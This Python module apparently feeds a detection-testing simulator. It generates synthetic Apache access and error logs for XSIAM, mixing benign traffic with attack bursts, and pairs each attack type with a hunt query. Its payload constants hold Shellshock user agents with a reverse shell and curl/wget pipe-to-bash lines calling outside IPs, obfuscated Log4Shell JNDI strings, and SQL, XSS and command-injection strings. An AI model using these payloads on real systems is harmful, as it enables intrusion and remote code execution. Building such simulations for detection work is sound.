# modules/apache_httpd.py
# Simulates Apache httpd access and error logs for XSIAM.

import random
import string
import time
from datetime import datetime, timezone
from ipaddress import ip_network
try:
    from modules.session_utils import get_random_user, rand_ip_from_network
except ImportError:
    from session_utils import get_random_user, rand_ip_from_network

NAME = "Apache httpd"
DESCRIPTION = "Simulates Apache Web Server access and error logs in formats for XSIAM."
XSIAM_VENDOR = "apache"
XSIAM_PRODUCT = "httpd"
CONFIG_KEY = "apache_config"

# --- Module-level state for throttling ---
last_threat_event_time = 0

# --- Attack types for threat enumeration and forced dispatch ---
_ATTACK_TYPES = [
    "recon_scan", "directory_traversal", "auth_bruteforce",
    "server_error_burst", "critical_error", "malicious_payload",
    "webshell_execution", "log4shell_probe", "shellshock_probe",
    "method_probing", "credential_stuffing", "data_exfiltration",
]


def get_threat_names():
    """Returns all available attack types for this module."""
    return list(_ATTACK_TYPES)

# --- Realistic external IP first octets (cloud/hosting/bulletproof providers) ---
_EXTERNAL_IP_FIRST_OCTETS = [45, 52, 54, 62, 80, 91, 104, 142, 176, 185, 193, 194, 212, 213]


def _random_external_ip():
    """Generates a realistic external/hosting provider IP for attack traffic."""
    first = random.choice(_EXTERNAL_IP_FIRST_OCTETS)
    return f"{first}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def _mod_unique_id():
    """Generates an Apache mod_unique_id style identifier (22-char base62, not UUID)."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=22))


def _ssl_pair():
    """Returns a matched (ssl_protocol, ssl_cipher) pair using correct IANA/OpenSSL names."""
    version = random.choices(["TLSv1.2", "TLSv1.3"], weights=[0.6, 0.4])[0]
    if version == "TLSv1.3":
        cipher = random.choice([
            "TLS_AES_256_GCM_SHA384",
            "TLS_AES_128_GCM_SHA256",
            "TLS_CHACHA20_POLY1305_SHA256",
        ])
    else:
        cipher = random.choice([
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
        ])
    return version, cipher


# =============================================================================
# LOG BUILDERS
# =============================================================================

def _build_access_log_line(config, source_ip, method, url, status_code,
                            user_agent, referer, bytes_sent, username="-"):
    """Builds a single Apache access log line wrapped in a syslog-style header.

    Format matches the XSIAM v1.3 ApacheWebServer modeling rule regex patterns:
      - observer_name: extracted from syslog timestamp + hostname
      - target_port / local_ipv4: from hostname:port localIP pattern
      - source_ipv4 (client): coalesced from remote_ipv4 fallback
      - process_id: from between closing user-agent quote and next field
      - tls_protocol_version: TLSv... token
    """
    apache_conf = config.get(CONFIG_KEY, {})
    server_name = apache_conf.get("server_name", "www.examplecorp.com")
    local_port   = apache_conf.get("local_port", 443)
    local_ip     = apache_conf.get("server_ip", "10.0.10.50")

    now = datetime.now(timezone.utc)
    tz_offset = now.strftime('%z')

    # Syslog header — triggers observer_name extraction in the v1.3 parser.
    # Single PID shared between syslog header and log body for consistency.
    pid = random.randint(1000, 9999)
    syslog_header = f"{now.strftime('%b %d %H:%M:%S')} {server_name} httpd[{pid}]:"

    # Apache access log timestamp — CRITICAL: parser filter regex requires
    # [DD/MMM/YYYY:HH:MM:SS ±ZZZZ]
    timestamp = f"[{now.strftime('%d/%b/%Y:%H:%M:%S')} {tz_offset}]"
    request_line = f"{method} {url} HTTP/1.1"
    request_time_micros = random.randint(30000, 800000)

    ssl_protocol, ssl_cipher = _ssl_pair()
    unique_id = _mod_unique_id()

    # Realistic bytes_received: request line + HTTP headers (Host, User-Agent,
    # Accept, Accept-Encoding, Cookie, etc.) typically add 400-1200 bytes overhead.
    # POST/PUT/PATCH requests carry a body too.
    post_body_bytes = random.randint(100, 2000) if method in ("POST", "PUT", "PATCH") else 0
    bytes_received = len(request_line) + random.randint(400, 1200) + post_body_bytes
    # Response includes body + response headers (Date, Server, Content-Type,
    # Content-Length, ETag, HSTS, etc.) typically 200-600 bytes overhead.
    bytes_sent_headers = bytes_sent + random.randint(200, 600)

    log_parts = [
        f"{server_name}:{local_port}", local_ip, source_ip, "-", username, timestamp,
        f'"{request_line}"', str(status_code), str(bytes_sent), f'"{referer}"', f'"{user_agent}"',
        str(pid), str(request_time_micros), "on", ssl_protocol, ssl_cipher,
        unique_id, str(random.randint(49152, 65535)), str(bytes_received), str(bytes_sent_headers),
        f'"{server_name}"', "main", "-", "-"
    ]
    return f"{syslog_header} {' '.join(log_parts)}"


def _build_error_log_line(config, source_ip, level, error_code, message):
    """Builds a single Apache error log line in syslog-compatible format.

    The [msg "..."] wrapper is intentional: the XSIAM v1.3 parser's message1 regex
    specifically captures content inside [msg "..."] for xdm.event.description.
    severity1 is captured from the [level] bracket after httpd[pid]:.
    """
    apache_conf = config.get(CONFIG_KEY, {})
    hostname = apache_conf.get("server_name", "www.examplecorp.com")

    pid = random.randint(1000, 9999)
    tid = random.randint(140000000000, 140999999999)  # realistic Linux pthread_t range

    syslog_header = f"{datetime.now(timezone.utc).strftime('%b %d %H:%M:%S')} {hostname} httpd[{pid}]:"
    # severity1 regex: ]:\s*\[([^\]]+)\]  — matches ]: [level]
    # pid regex:       \[\w+\s(\d+)\:     — matches [pid NNN:tid
    # tid regex:       tid\s(\d+)         — matches tid NNN
    # client regex:    client\s(\d{1,3}...) — matches [client IP]
    # message1 regex:  \[msg\s\"*([^\"]+)\" — matches [msg "AH####: ..."]
    log_parts = [
        syslog_header,
        f"[{level}]",
        f"[pid {pid}:tid {tid}]",
        f"[client {source_ip}]",
        f'[msg "{error_code}: {message}"]',
    ]
    return " ".join(log_parts)


# =============================================================================
# ERROR CODE POOLS  (verified Apache AH codes)
# =============================================================================

_ROUTINE_ERROR_POOL = [
    ("notice", "AH00292", "Apache/2.4.62 (Unix) configured -- resuming normal operations"),
    ("notice", "AH00025", "caught SIGTERM, shutting down"),
    ("info",   "AH00163", "Server built: Oct 31 2023 08:00:00"),
    ("warn",   "AH00112", "Warning: DocumentRoot [/var/www/html/staging] does not exist"),
    ("error",  "AH00128", "File does not exist: /var/www/html/wp-admin/admin-ajax.php"),
    ("warn",   "AH00132", "file permissions deny server access: /var/www/html/.htaccess"),
]

_CRITICAL_ERROR_POOL = [
    # AH00052: child process terminated by POSIX signal (Linux)
    ("crit",  "AH00052", "child pid {pid} exit signal Segmentation fault (11)"),
    # AH00072: make_sock bind failure — port in use or insufficient permissions
    ("alert", "AH00072", "make_sock: could not bind to address 0.0.0.0:443"),
    ("crit",  "AH00052", "child pid {pid} exit signal Aborted (6), possible coredump in /var/log/httpd"),
]


def _generate_routine_error_log(config):
    """Generates a routine (non-threat) error log entry with verified Apache AH codes."""
    server_ip = config.get(CONFIG_KEY, {}).get("server_ip", "10.0.10.50")
    level, error_code, message = random.choice(_ROUTINE_ERROR_POOL)
    print(f"[Apache] Generating routine error log: {level} {error_code}")
    return _build_error_log_line(config, server_ip, level, error_code, message)


# =============================================================================
# USER AGENT SELECTION
# =============================================================================

def _get_user_agent(config, event_type="benign"):
    """Selects a realistic user agent, heavily favouring browsers for benign traffic
    and scanner/tool agents for threat traffic."""
    all_user_agents = config.get('user_agents', ["-"])
    browser_agents = [ua for ua in all_user_agents if "Mozilla" in ua]
    tool_agents    = [ua for ua in all_user_agents if "Mozilla" not in ua]

    if event_type == "benign":
        return random.choice(browser_agents) if browser_agents else "-"
    else:
        if random.random() < 0.9 and tool_agents:
            return random.choice(tool_agents)
        return random.choice(browser_agents) if browser_agents else "-"


# =============================================================================
# THREAT CONSTANTS
# =============================================================================

# --- Existing attack payload constants ---

# Endpoints protected by HTTP Basic Auth (.htpasswd or mod_auth_basic).
# Return 401 Unauthorized on failed authentication.
_BASIC_AUTH_URLS = [
    "/admin/",
    "/admin/dashboard",
    "/portal/login",
    "/secure/",
    "/restricted/data",
    "/internal/api/status",
    "/management/console",
    "/wp-admin/admin-ajax.php",
    "/phpmyadmin/",
]

# SQL injection payloads (percent-encoded — no raw spaces in URLs)
_ENCODED_SQL_PAYLOADS = [
    "%27+OR+1%3D1--",
    "%27+UNION+SELECT+NULL--",
    "1%3BSELECT+SLEEP%285%29--",
    "%27+OR+%271%27%3D%271",
    "1+AND+1%3D1",
]

# XSS payloads (percent-encoded)
_ENCODED_XSS_PAYLOADS = [
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
    "%3Csvg+onload%3Dalert%281%29%3E",
]

# Command injection payloads (percent-encoded)
_ENCODED_CMD_PAYLOADS = [
    "%3B+cat+%2Fetc%2Fpasswd",
    "%7C+id",
    "%26%26+whoami",
    "%60id%60",
]

# --- NEW: Log4Shell (CVE-2021-44228) JNDI injection in User-Agent ---
# Attackers inject into every request header; the server processes the HTTP request
# normally while the Log4j library asynchronously makes an outbound JNDI callback.
# Hunt query: user_agent contains "${jndi:"
_LOG4SHELL_AGENTS = [
    "${jndi:ldap://185.220.101.47:1389/a}",
    "${jndi:ldap://45.142.212.100:1389/exploit}",
    "Mozilla/5.0 ${jndi:ldap://91.108.4.22:1389/log4j}",
    # Obfuscated variants designed to evade WAF pattern matching
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://45.142.212.100:1389/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://185.220.101.47:1389/}",
    "${jndi:dns://185.220.101.47/test}",
]

# --- NEW: Shellshock (CVE-2014-6271) bash function definition in User-Agent ---
# Injected into CGI requests; a vulnerable bash (< 4.3 patch 25) on the server
# executes the trailing command when it processes environment variables.
# Hunt query: user_agent contains "() {"
_SHELLSHOCK_AGENTS = [
    "() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1'",
    "() { :; }; curl -s http://45.142.212.100/shell.sh | bash",
    "() { :; }; wget -q -O- http://91.108.4.22/payload.sh | sh",
    "() { ignored; }; echo Content-Type: text/plain ; echo ; cat /etc/passwd",
    "() { :; }; /usr/bin/python3 -c 'import socket,subprocess,os; ...'",
]

# --- NEW: HTTP method probing ---
# Attackers enumerate allowed HTTP methods as a reconnaissance step.
# TRACE enables XST attacks; CONNECT is used in SSRF chains; PROPFIND for WebDAV.
# Hunt query: method in (TRACE, CONNECT, PROPFIND, TRACK, DEBUG)
# Tuple: (method, url, response_status)
_PROBE_METHODS = [
    ("TRACE",    "/",             "200"),   # XST — echoes request back if misconfigured
    ("TRACE",    "/index.html",   "405"),   # Hardened server rejects
    ("CONNECT",  "/",             "405"),   # SSRF chain setup attempt
    ("PROPFIND", "/",             "405"),   # WebDAV enumeration
    ("PROPFIND", "/uploads/",     "405"),   # Look for writable WebDAV share
    ("TRACK",    "/",             "405"),   # Legacy MS-specific trace variant
    ("DEBUG",    "/",             "405"),   # .NET debug endpoint probing
]

# --- NEW: Web shell — upload endpoint → resulting shell paths ---
# Phase 1: attacker POSTs malicious PHP to an upload handler (large request, small response)
# Phase 2: attacker POSTs OS commands to the uploaded shell (tiny response = command output)
# Hunt query: POST *.php in /uploads/ with bytes_sent < 500 AND status=200
_WEBSHELL_UPLOAD_ENDPOINTS = [
    "/upload.php",
    "/api/v1/upload",
    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
    "/images/upload.php",
    "/assets/upload",
]

_WEBSHELL_PATHS = [
    "/uploads/shell.php",
    "/uploads/image.php",
    "/wp-content/uploads/2025/03/img.php",
    "/images/thumb.php",
    "/assets/js/util.php",
]

# --- NEW: Data exfiltration endpoints ---
# Authenticated session, same source IP, many requests to bulk-download endpoints.
# Hunt query: sum(bytes_sent) by source_ip over window | filter > threshold
_EXFIL_ENDPOINTS = [
    "/api/v1/export",
    "/api/v2/users/export",
    "/admin/reports/download",
    "/api/data/bulk",
    "/reports/monthly-report.csv",
    "/api/v1/customers/all",
    "/api/v2/transactions/export",
]


# =============================================================================
# BENIGN TRAFFIC CONSTANTS
# =============================================================================

# Search engine and social media crawler profiles: (user_agent, ip_prefix)
# IPs are derived from well-known crawler ranges.
# Hunt exclusion: NOT user_agent contains "Googlebot" OR "bingbot"
_BOT_PROFILES = [
    ("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "66.249"),
    ("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "66.249"),
    ("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",  "157.55"),
    ("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",          "77.88"),
    ("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", "173.252"),
    ("Twitterbot/1.0",                                                             "199.16"),
]

_CRAWLER_URLS = [
    "/robots.txt",
    "/sitemap.xml",
    "/sitemap_index.xml",
    "/",
    "/about.html",
]

# Load balancer / uptime monitor health check endpoints.
# These dominate real server logs — critical for hunt exclusion filters.
_HEALTH_CHECK_URLS = [
    "/health",
    "/ping",
    "/healthz",
    "/status",
    "/api/health",
    "/api/v1/health",
]

# Health check user agents: AWS ELB, GCP load balancer, HAProxy, k8s liveness probes
_HEALTH_CHECK_AGENTS = [
    "ELB-HealthChecker/2.0",
    "GoogleHC/1.0",
    "HAProxy/2.8",
    "curl/7.88.1",
    "kube-probe/1.29",
]

# API endpoints that trigger CORS preflight OPTIONS from browser SPAs.
# Every cross-origin API call from a modern SPA is preceded by an OPTIONS request.
_CORS_ENDPOINTS = [
    "/api/v1/userinfo",
    "/api/v2/data",
    "/api/auth",
    "/api/v1/search",
    "/api/v1/products",
    "/api/v2/orders",
]


# =============================================================================
# BENIGN GENERATOR HELPERS
# =============================================================================

def _generate_health_check(config):
    """Generates a load-balancer or uptime-monitor health check request.
    Source IP is derived from the server's subnet (typical LB placement at .1).
    These are very frequent in real logs and must be excluded in most hunt queries
    using: source_ip in internal_cidrs OR user_agent in (ELB-HealthChecker, ...)
    """
    apache_conf = config.get(CONFIG_KEY, {})
    server_ip = apache_conf.get("server_ip", "10.0.10.50")
    # Load balancer is conventionally at .1 in the same /24 as the web server
    lb_ip = server_ip.rsplit('.', 1)[0] + ".1"
    url   = random.choice(_HEALTH_CHECK_URLS)
    agent = random.choice(_HEALTH_CHECK_AGENTS)
    # Response body is minimal: {"status":"ok"} or just "OK\n"
    bytes_sent = random.randint(28, 80)
    return _build_access_log_line(config, lb_ip, "GET", url, "200", agent, "-", bytes_sent)


def _generate_options_preflight(config):
    """Generates an HTTP OPTIONS CORS preflight request from a browser SPA.
    Modern single-page apps send OPTIONS before every cross-origin API call.
    Hunt exclusion: method = OPTIONS AND url starts_with /api/
    """
    source_info = random.choice(config.get('benign_ingress_sources', [{}]))
    source_ip = rand_ip_from_network(ip_network(source_info.get("ip_range", "68.0.0.0/11"), strict=False))
    url       = random.choice(_CORS_ENDPOINTS)
    user_agent = _get_user_agent(config, "benign")
    referer   = random.choice(config.get(CONFIG_KEY, {}).get("referers", ["-"]))
    # OPTIONS returns 204 No Content (CORS headers only, no body) or 200
    status = random.choice(["204", "200"])
    return _build_access_log_line(config, source_ip, "OPTIONS", url, status,
                                  user_agent, referer, 0)


def _generate_head_request(config):
    """Generates an HTTP HEAD request from a CDN, monitoring agent, or link checker.
    HEAD is identical to GET but the server returns no body — bytes_sent is always 0.
    Hunt note: HEAD with bytes_sent > 0 would be a parser anomaly worth investigating.
    """
    source_info = random.choice(config.get('benign_ingress_sources', [{}]))
    source_ip = rand_ip_from_network(ip_network(source_info.get("ip_range", "68.0.0.0/11"), strict=False))
    url        = random.choice(config.get(CONFIG_KEY, {}).get("benign_urls", ["/index.html"]))
    user_agent = _get_user_agent(config, "benign")
    return _build_access_log_line(config, source_ip, "HEAD", url, "200",
                                  user_agent, "-", 0)


def _generate_crawler_request(config):
    """Generates a search engine or social media crawler request.
    Uses realistic bot user agents paired with their known IP prefixes.
    Hunt exclusion: user_agent contains "Googlebot" OR "bingbot" OR "YandexBot"
    """
    ua, ip_prefix = random.choice(_BOT_PROFILES)
    source_ip = f"{ip_prefix}.{random.randint(64, 255)}.{random.randint(1, 254)}"
    url       = random.choice(_CRAWLER_URLS)
    bytes_sent = random.randint(128, 5000)
    return _build_access_log_line(config, source_ip, "GET", url, "200",
                                  ua, "-", bytes_sent)


# =============================================================================
# THREAT GENERATOR
# =============================================================================

def _generate_attack_burst(config, session_context=None, forced_type=None):
    """Generates a burst of threat logs.

    Attack types and their primary hunt approaches:
      recon_scan          — count 404s from single IP over time window
      directory_traversal — count 403s from single IP; look for ../ or %2F in URL
      auth_bruteforce     — count 401s from single IP to same URL (single-source)
      server_error_burst  — count 5xx from same URL; look for POST to unusual endpoints
      critical_error      — filter xdm.event.log_level in (CRITICAL, ALERT)
      malicious_payload   — look for SQL/XSS/cmd patterns in xdm.network.http.url
      webshell_execution  — POST to *.php in /uploads/ AND bytes_sent < 500
      log4shell_probe     — user_agent contains "${jndi:"
      shellshock_probe    — user_agent contains "() {"
      method_probing      — method in (TRACE, CONNECT, PROPFIND, TRACK, DEBUG)
      credential_stuffing — count_distinct(source_ip) on 401s to same login URL
      data_exfiltration   — sum(bytes_sent) by source_ip exceeds threshold
    """
    attacker_ip = _random_external_ip()
    user_agent  = _get_user_agent(config, event_type="threat")
    burst_size  = random.randint(15, 25)
    logs        = []

    if forced_type and forced_type in _ATTACK_TYPES:
        attack_type = forced_type
    else:
        attack_type = random.choice(_ATTACK_TYPES)

    if attack_type == "credential_stuffing":
        print(f"[Apache] Generating attack burst: {attack_type} (distributed, multiple IPs)")
    else:
        print(f"[Apache] Generating attack burst: {attack_type} from {attacker_ip}")

    # Pre-compute per-burst state for phase-based and session-based attack types.
    # These are defined unconditionally; Python only evaluates the matching elif branch
    # at runtime, so unused variables for other attack types are harmless.
    ws_upload_count    = random.randint(1, 3)
    ws_upload_endpoint = random.choice(_WEBSHELL_UPLOAD_ENDPOINTS)
    ws_shell_path      = random.choice(_WEBSHELL_PATHS)
    ws_server_name     = config.get(CONFIG_KEY, {}).get("server_name", "www.examplecorp.com")

    if session_context:
        _session_username = random.choice(list(session_context.keys()))
    else:
        _session_username = random.choice(
            list(config.get('zscaler_config', {}).get('users', {}).keys()) or ['admin'])
    exfil_url      = random.choice(_EXFIL_ENDPOINTS)
    exfil_username = _session_username

    for i in range(burst_size):

        # --- Existing attack types ---

        if attack_type == "recon_scan":
            url = random.choice(config.get(CONFIG_KEY, {}).get("recon_urls", ["/admin.php"]))
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", url, "404", user_agent, "-", 300))

        elif attack_type == "directory_traversal":
            url = random.choice([
                "/cgi-bin/..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "/includes/../../../../etc/shadow",
                "/.git/config",
                "/.env",
                "/backup.sql.gz",
                "/conf/web.config.bak",
            ])
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", url, "403", user_agent, "-", 209))

        elif attack_type == "auth_bruteforce":
            # Single source IP, high volume — distinct from credential_stuffing (many IPs)
            url = random.choice(_BASIC_AUTH_URLS)
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", url, "401", user_agent, "-", 401,
                username=_session_username))

        elif attack_type == "server_error_burst":
            url = random.choice(["/api/v1/process", "/api/v2/execute", "/cgi-bin/handler.pl"])
            status_code = random.choice(["500", "502", "503"])
            logs.append(_build_access_log_line(
                config, attacker_ip, "POST", url, status_code, user_agent, "-", 521))

        elif attack_type == "malicious_payload":
            payload_type = random.choice(["sql", "xss", "cmd"])
            if payload_type == "sql":
                url = f"/search.php?id={random.choice(_ENCODED_SQL_PAYLOADS)}"
            elif payload_type == "xss":
                url = f"/comment.php?text={random.choice(_ENCODED_XSS_PAYLOADS)}"
            else:
                url = f"/cgi-bin/process.cgi?cmd={random.choice(_ENCODED_CMD_PAYLOADS)}"
            status_code = random.choice(["404", "400", "403"])
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", url, status_code, user_agent, "-", 412))

        elif attack_type == "critical_error":
            level, error_code, msg_template = random.choice(_CRITICAL_ERROR_POOL)
            message = msg_template.format(pid=random.randint(1000, 9999))
            server_ip = config.get(CONFIG_KEY, {}).get("server_ip", "10.0.10.50")
            logs.append(_build_error_log_line(config, server_ip, level, error_code, message))

        # --- New attack types ---

        elif attack_type == "webshell_execution":
            # Phase 1 (first ws_upload_count events): upload the shell.
            #   POST to a file-upload handler with a large request body (the .php payload).
            #   Response is small — an upload confirmation JSON or filename echo.
            # Phase 2 (remaining events): execute OS commands via the uploaded shell.
            #   POST to the shell path with a tiny response (command output: id, ls, etc.).
            # Hunt: POST to *.php inside /uploads/ with bytes_sent < 500 AND status=200
            if i < ws_upload_count:
                logs.append(_build_access_log_line(
                    config, attacker_ip, "POST", ws_upload_endpoint, "200",
                    user_agent, "-", random.randint(150, 400)))
            else:
                referer = f"http://{ws_server_name}{ws_upload_endpoint}"
                logs.append(_build_access_log_line(
                    config, attacker_ip, "POST", ws_shell_path, "200",
                    user_agent, referer, random.randint(20, 450)))

        elif attack_type == "log4shell_probe":
            # JNDI injection in User-Agent against normal-looking endpoints.
            # The HTTP request completes normally (200); the Log4j library asynchronously
            # triggers an outbound LDAP/DNS callback to the attacker's server.
            # Obfuscated variants evade simple WAF string matching.
            # Hunt: user_agent contains "${jndi:" (case-insensitive for obfuscated forms)
            url = random.choice(
                config.get(CONFIG_KEY, {}).get("benign_urls", ["/index.html"]) +
                ["/api/v1/login", "/api/v1/search", "/", "/api/v2/userinfo"]
            )
            jndi_agent  = random.choice(_LOG4SHELL_AGENTS)
            status_code = random.choices(["200", "404", "400"], weights=[0.7, 0.2, 0.1])[0]
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", url, status_code, jndi_agent, "-",
                random.randint(1000, 15000)))

        elif attack_type == "shellshock_probe":
            # Bash function definition injected into User-Agent, targeting CGI endpoints.
            # A vulnerable bash (< 4.3 patch 25) executes the trailing command when it
            # processes CGI environment variables (HTTP_USER_AGENT).
            # Mix of 500 (bash crash on exploit attempt) and 200 (successful exploitation).
            # Hunt: user_agent contains "() {" AND url contains "/cgi-bin/"
            url = random.choice([
                "/cgi-bin/bash",
                "/cgi-bin/test.cgi",
                "/cgi-bin/status",
                "/cgi-bin/handler.pl",
                "/cgi-bin/printenv",
            ])
            shellshock_agent = random.choice(_SHELLSHOCK_AGENTS)
            status_code = random.choices(["500", "200", "404"], weights=[0.5, 0.3, 0.2])[0]
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", url, status_code, shellshock_agent, "-",
                random.randint(0, 500)))

        elif attack_type == "method_probing":
            # Enumerate allowed HTTP methods as a reconnaissance step.
            # TRACE (XST attack), CONNECT (SSRF setup), PROPFIND (WebDAV enumeration).
            # A hardened server returns 405 Method Not Allowed; a misconfigured one may 200.
            # Hunt: method in (TRACE, CONNECT, PROPFIND, TRACK, DEBUG) — almost never legitimate
            method, url, status_code = random.choice(_PROBE_METHODS)
            logs.append(_build_access_log_line(
                config, attacker_ip, method, url, status_code, user_agent, "-",
                random.randint(0, 300)))

        elif attack_type == "credential_stuffing":
            # DISTRIBUTED: each attempt originates from a DIFFERENT external IP (botnet).
            # This is the key distinction from auth_bruteforce (single IP, high volume).
            # Typically one attempt per IP to stay under per-IP rate limiting.
            # Hunt: count_distinct(source_ip) on status=401 to same URL over time window
            stuffing_ip = _random_external_ip()
            logs.append(_build_access_log_line(
                config, stuffing_ip, "POST", "/api/auth", "401",
                user_agent, "-", 280, username=_session_username))

        elif attack_type == "data_exfiltration":
            # Authenticated session (stolen credentials) downloading large amounts of data.
            # Same source IP, same username, repeated requests to bulk-export endpoints.
            # Each individual request may look plausible; the anomaly is total volume.
            # Hunt: sum(bytes_sent) by source_ip, username over 1h | filter sum > 50MB
            bytes_sent = random.randint(500000, 5000000)  # 500KB–5MB per request
            logs.append(_build_access_log_line(
                config, attacker_ip, "GET", exfil_url, "200",
                user_agent, "-", bytes_sent, username=exfil_username))

        time.sleep(random.uniform(0.1, 0.3))

    return (logs, attack_type)


# =============================================================================
# SCENARIO LOG (coordinated simulator)
# =============================================================================

def _generate_scenario_log(config, scenario):
    """Generates a log for a correlated attack scenario from the orchestrator."""
    print(f"    - Apache Module creating scenario log for user {scenario.get('source_user')}")
    source_ip  = scenario.get('source_ip')
    user_agent = scenario.get('user_agent', _get_user_agent(config, "benign"))
    url        = scenario.get('url', '/download.php?file=update.exe')
    status_code = scenario.get('status_code', '200')
    bytes_sent  = random.randint(100000, 500000)
    return _build_access_log_line(
        config, source_ip, "GET", url, status_code, user_agent, "-", bytes_sent)


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

def generate_log(config, scenario=None, threat_level="Realistic",
                 benign_only=False, context=None, scenario_event=None):
    """Main function to generate either a standalone or scenario-based log."""
    global last_threat_event_time
    session_context = (context or {}).get('session_context')

    if scenario:
        return _generate_scenario_log(config, scenario)

    # --- Specific threat forced dispatch ---
    if scenario_event and scenario_event in _ATTACK_TYPES:
        last_threat_event_time = time.time()
        return _generate_attack_burst(config, session_context, forced_type=scenario_event)

    # --- Threat generation (skipped entirely when benign_only=True) ---
    if not benign_only:
        if threat_level == "Insane":
            if random.random() < 0.9:
                last_threat_event_time = time.time()
                return _generate_attack_burst(config, session_context)
        else:
            interval = config.get('threat_generation_levels', {}).get(threat_level, 7200)
            if (time.time() - last_threat_event_time) > interval:
                last_threat_event_time = time.time()
                return _generate_attack_burst(config, session_context)

    # --- Benign traffic type selection ---
    # A single weighted draw selects the benign log category for this call.
    # Weights approximate real Apache log distributions:
    #   access      ~76%  — standard page/API requests (GET, POST)
    #   error        10%  — routine notice/warn/error server-side events
    #   health_check  6%  — load balancer / k8s liveness probes (GET /health)
    #   options       4%  — CORS preflight from browser SPA (OPTIONS /api/*)
    #   head          2%  — CDN / link-checker / monitoring (HEAD)
    #   crawler       2%  — Googlebot, bingbot, Twitterbot (GET /robots.txt)
    benign_type = random.choices(
        ["access", "error", "health_check", "options", "head", "crawler"],
        weights=[76, 10, 6, 4, 2, 2],
        k=1,
    )[0]

    if benign_type == "error":
        return _generate_routine_error_log(config)
    elif benign_type == "health_check":
        return _generate_health_check(config)
    elif benign_type == "options":
        return _generate_options_preflight(config)
    elif benign_type == "head":
        return _generate_head_request(config)
    elif benign_type == "crawler":
        return _generate_crawler_request(config)

    # --- Benign access log (76% of calls) ---
    source_info = random.choice(config.get('benign_ingress_sources', [{}]))
    source_ip   = rand_ip_from_network(ip_network(source_info.get("ip_range", "68.0.0.0/11"), strict=False))
    referer    = random.choice(config.get(CONFIG_KEY, {}).get("referers", ["-"]))
    user_agent = _get_user_agent(config, event_type="benign")
    username   = "-"

    if random.random() < 0.1:
        if session_context:
            username = random.choice(list(session_context.keys()))
        else:
            username = random.choice(
                list(config.get('zscaler_config', {}).get('users', {}).keys()) or ['unknown_user'])

    # Status code distribution: 90% success, realistic error tail.
    # 302 Temporary Redirect included — more common than 301 in live logs.
    benign_status_codes = ["200", "304", "301", "302", "404", "500"]
    weights             = [0.90,  0.04,  0.01,  0.01,  0.02,  0.01]
    status_code = random.choices(benign_status_codes, weights=weights, k=1)[0]

    bytes_sent = 0
    url    = ""
    method = "GET"

    if status_code == "200":
        r = random.random()
        if r < 0.02:
            bytes_sent = random.randint(1000000, 5000000)
            url = "/assets/large-download.zip"
        elif r < 0.10:
            bytes_sent = random.randint(100000, 500000)
            url = "/images/high-res-promo.jpg"
        else:
            bytes_sent = random.randint(2000, 15000)
            url = random.choice(config.get(CONFIG_KEY, {}).get("benign_urls", ["/index.html"]))
            # API and form endpoints receive POST in real web traffic
            if url in ("/api/v1/userinfo", "/contact.php"):
                method = random.choices(["GET", "POST"], weights=[0.3, 0.7])[0]

    elif status_code == "304":
        bytes_sent = 0
        url = random.choice(config.get(CONFIG_KEY, {}).get("benign_urls", ["/index.html"]))

    elif status_code == "301":
        url, bytes_sent = "/old-page.html", 178

    elif status_code == "302":
        url = random.choice(["/login", "/auth/sso", "/index.html"])
        bytes_sent = 0

    elif status_code == "404":
        url       = random.choice(["/missing.css", "/images/old_logo.png", "/favicon.ico"])
        bytes_sent = 302

    elif status_code == "500":
        url, bytes_sent = "/api/v1/user/search", 521

    return _build_access_log_line(
        config, source_ip, method, url, status_code,
        user_agent, referer, bytes_sent, username=username)
